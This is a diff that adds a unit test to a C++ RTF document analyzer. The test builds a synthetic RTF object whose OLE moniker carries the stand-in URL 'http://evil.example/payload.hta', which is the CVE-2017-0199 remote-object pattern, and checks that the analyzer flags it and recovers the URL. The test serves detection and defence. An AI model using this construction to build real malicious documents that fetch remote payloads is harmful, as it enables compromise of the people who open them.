@@ -5421,6 +5421,24 @@ void TestRtfAnalyzer() {
   Expect(a.embeddedExecutable && has(a, "rtf.embedded_pe"),
          "RTF: embedded PE in \\objdata flagged");
 
+  // CVE-2017-0199: an object whose moniker carries a remote URL (UTF-16LE in the
+  // OLE moniker -> NUL-interleaved). Build "h\0t\0t\0p\0..." and hex it.
+  {
+    std::string moniker = "http://evil.example/payload.hta";
+    std::string utf16;
+    for (char c : moniker) { utf16.push_back(c); utf16.push_back('\0'); }
+    std::string rh = "d0cf11e0a1b11ae1"; // OLE magic
+    for (unsigned char c : utf16) {
+      char buf[3]; std::snprintf(buf, sizeof(buf), "%02x", c); rh += buf;
+    }
+    const auto r = AnalyzeRtf(bytes(
+        "{\\rtf1\\ansi {\\object\\objemb{\\*\\objdata " + rh + "}}}"));
+    Expect(r.remoteLink && has(r, "rtf.remote_object_load"),
+           "RTF: remote-object URL (CVE-2017-0199) flagged");
+    Expect(!r.urls.empty() && r.urls.front().find("evil.example") != std::string::npos,
+           "RTF: the remote URL is recovered from the UTF-16 moniker");
+  }
+
   // A benign RTF (plain text, no objects) flags nothing.
   const auto benign = AnalyzeRtf(bytes("{\\rtf1\\ansi Hello, world.}"));
   Expect(benign.isRtf && benign.findings.empty(),
